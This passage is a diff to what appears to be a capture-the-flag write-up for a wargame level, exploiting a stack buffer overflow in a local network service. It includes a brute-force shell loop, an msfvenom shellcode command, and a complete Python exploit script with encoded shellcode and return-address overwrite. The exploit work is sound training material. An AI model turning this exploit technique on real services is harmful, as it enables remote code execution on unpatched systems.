@@ -155,6 +155,7 @@ Now let's see how we can break it:
 * If the supplied password is correct (first 8 characters of the name), it will copy the name into the **result** array (**[4]**), which is also 256 bytes in size.
 * But that's where the problem lies, because it will copy the name after the welcome message, basically writing past the boundaries of **result** variable and smashing the stack.
 
+## 2 - Exploit
 To understand exactly how many bytes we need in order to overwrite the return address, take a look at the stack layout of **handle_client** function:
 
 ![Stack layout](/assets/images/bm4-1.png)
@@ -167,6 +168,108 @@ The layout and the following observations will help in constructing the proper p
 
 So our payload will look like this:
 ```
-| password (8 bytes) | JUNK (235 bytes) | | RET| 
+| password (8 bytes) | JUNK (235 bytes) | | RET | 
+```
+
+Next question is where should we place the payload? We cannot use the previous approach with the shellcode in an environment variable because the program is already started, we cannot control the environment anymore. But we have so much space left in the name variable (_Hint!_).
+
+Since there is no ASLR, the address of the buffer on the stack is predictable. My approach here was a bit lazy:
+* First I've run the program in the debugger and also on my machine to get an idea about how the addresses of the buffer look like
+* Thent did a small brute-force script to go through each address and construct a corresponding payload. I'm sure that it must be a more clever way. Anyway, this approached worked very very quickly, so no need to change it.
+
+To print the value of the stack pointer from C source code, we can just embed this two instructions:
+```c
+   register int sp asm ("sp");
+   printf("%x", sp);
+```
+
+Using this trick, I've found that the stack address for a recompiled program run outside the debugger was **0xffffd690**, or **0xffffd6a0** or close to these values. So the brute-force script - **try.sh**, goes from 0xFFFFD000 to 0xFFFFF000. This was enough.
+
+```bash
+#!/bin/bash                                                                                                        
+
+#for i in `seq 0xFFFFD000 0xFFFFF000`;
+for i in `seq 4294955008 4294963200`;
+do
+    python /tmp/bof.py $(printf "%X" $i)
+done
+```
+
+The python script **bof.py** constructs and sends a payload over the socket for each value in the chosen range. One more thing here. We need a different shellcode than before. Spawning /bin/dash will not help us at all. I went for running the **victory** and piping the result to a temporary file:
+```bash
+# msfvenom  -p linux/x86/exec CMD="/home/level5/victory > /tmp/out" -e x86/shikata_ga_nai -b '\x00' -f python
+```
+
+So let's put everything together:
+
+```python
+#!/usr/bin/python                                                                                                   
+import socket
+import struct
+import sys
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#s.settimeout(15)
+host = "127.0.0.1"
+port = 5555
+
+# Output victory to /tmp/out 
+# msfvenom  -p linux/x86/exec CMD="/home/level5/victory > /tmp/out" -e x86/shikata_ga_nai -b '\x00' -f python
+buf =  ""
+buf += "\xdb\xcb\xd9\x74\x24\xf4\xbb\x5c\xb7\x43\x7e\x5a\x31"
+buf += "\xc9\xb1\x11\x31\x5a\x1a\x83\xea\xfc\x03\x5a\x16\xe2"
+buf += "\xa9\xdd\x48\x26\xc8\x70\x29\xbe\xc7\x17\x3c\xd9\x7f"
+buf += "\xf7\x4d\x4e\x7f\x6f\x9d\xec\x16\x01\x68\x13\xba\x35"
+buf += "\x4a\xd4\x3a\xc6\xa4\xbc\x55\xab\xdf\x13\xc5\x56\x56"
+buf += "\x09\x79\xac\xb9\xa7\xe8\xad\xb1\x28\x98\x48\x1a\x89"
+buf += "\x7c\x84\x2e\x98\x0c\xf5\xa1\x17\x98\x09\x69\x8b\xe9"
+buf += "\xeb\x58\xab"
+
+try:
+    s.connect((host, port))
+    print "[*] Connected."
+    
+    # Get question
+    data = s.recv(64)
+    print data
+    
+    # Send name
+    offset = int(sys.argv[1], 16)  # 0xffffcfc8
+    print "[*] Trying offsfet: %X" % offset
+    ret =  struct.pack("<L", offset+40)
+    buf = "1zUeOvtC" + "\x90"*100 + buf + "\x90"*(235-100-len(buf)) + ret + "\n"
+    s.sendall(buf)
+
+    data = s.recv(300)
+    print data
+finally:
+    s.close
+```
+
+## 3 - Profit
+
+```bash
+$ bash /tmp/try.sh
+$ cat /tmp/out
+
+   ___  _                      __  ___         __
+  / _ )(_)__  ___ _______ __  /  |/  /__ ____ / /____ ______ __
+ / _  / / _ \/ _ `/ __/ // / / /|_/ / _ `(_-</ __/ -_) __/ // /
+/____/_/_//_/\_,_/_/  \_, / /_/  /_/\_,_/___/\__/\__/_/  \_, / 
+                     /___/                 _            /___/  
+                             ___ ___  ___ (_)__ ____    
+                            / -_) _ \(_-</ / _ `/ _ \   
+                            \__/_//_/___/_/\_, /_//_/   
+                                          /___/  
+Subject: Victory!                         
+
+Congrats, you have solved level4. To update your score,
+send an e-mail to unlock@certifiedsecure.com and include:
+   * your CS-ID
+   * which level you solved (level4 @ binary mastery ensign)
+   * the exploit 
+   
+You can now start with level5. If you want, you can log in
+as level5 with password  [REDACTED]
 ```
 
